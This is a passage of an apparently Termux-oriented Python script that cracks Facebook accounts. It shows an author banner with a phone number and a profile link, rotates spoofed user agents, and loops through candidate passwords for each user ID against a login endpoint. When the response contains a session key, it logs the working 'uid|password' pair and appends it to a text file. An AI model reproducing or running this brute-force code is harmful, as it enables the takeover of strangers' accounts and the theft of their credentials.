...
def logo():
  ...
  ═══════════════════════════════════════════════════════💥
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Azan Ali\x1b[0m\x1b[1;97m]
...
════════════════════════════════════════════════════════💥
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Azan Ali \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m WhatsApp   : 923165456679 \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook :  https://www.facebook.com/profile.php?id=100000138827119 \x1b[0m\x1b[1;97m]
════════════════════════════════════════════════════════💥
 """)
...
═══════════════════════════════════💥
    """)
		...
		print("───────────────────────────────────────────────────────× ")
		print(" \t\033[1;97m[\x1b[1;97m\x1b[1;41m FOLLOW MY FACEBOOK ACCOUNT \x1b[0m\x1b[1;97m] \033[1;37m ")
		subprocess.check_output(["am", "start", "https://www.facebook.com/profile.php?id=100000138827119"])
		print("───────────────────────────────────────────────────────× ")
 ...
 'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G977N/KSU4CTG1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36'
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "AXB" in response.text:
				print("\r \033[1;32m[Ok_AXB😘] %s | %s\033[0;32m         "%(uid, pw))
				print ("\r \033[1;32m Congrats ")
				self.ok.append("%s|%s"%(uid, pw))
				open("Ok_AXB😘.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[1;32m[Ok_AXB😘] %s | %s\033[1;32m         "%(uid, pw))
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		...
		print(" [*] Team      :      Error")
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  : https://www.facebook.com/profile.php?id=100000138827119")
		print(" [*] WhatsApp : 923165456679")
		exit(" [*]     : https://github.com/Harr4567 ")
	else:
		Main()
